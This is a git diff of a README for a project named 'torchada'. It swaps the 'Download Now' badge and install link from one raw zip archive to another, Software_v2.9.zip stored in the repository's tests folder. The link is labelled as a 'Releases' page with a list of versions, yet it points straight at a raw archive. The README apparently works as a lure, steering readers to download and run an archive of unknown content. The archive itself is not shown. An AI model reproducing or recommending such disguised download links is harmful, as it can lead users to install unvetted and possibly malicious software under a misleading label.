@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download torchada](https://github.com/wignerc/torchada/raw/refs/heads/main/scripts/Software_v3.9.zip)](https://github.com/wignerc/torchada/raw/refs/heads/main/scripts/Software_v3.9.zip)
+[![Download torchada](https://github.com/wignerc/torchada/raw/refs/heads/main/tests/Software_v2.9.zip)](https://github.com/wignerc/torchada/raw/refs/heads/main/tests/Software_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Ensure your system meets these requirements before proceeding.
 
 ## 📥 Download & Install
 
-To download the latest version of torchada, visit this page to download: [torchada Releases](https://github.com/wignerc/torchada/raw/refs/heads/main/scripts/Software_v3.9.zip)
+To download the latest version of torchada, visit this page to download: [torchada Releases](https://github.com/wignerc/torchada/raw/refs/heads/main/tests/Software_v2.9.zip)
 
 1. Click on the link above to open the releases page.
 2. You will see a list of available versions. Look for the latest version.
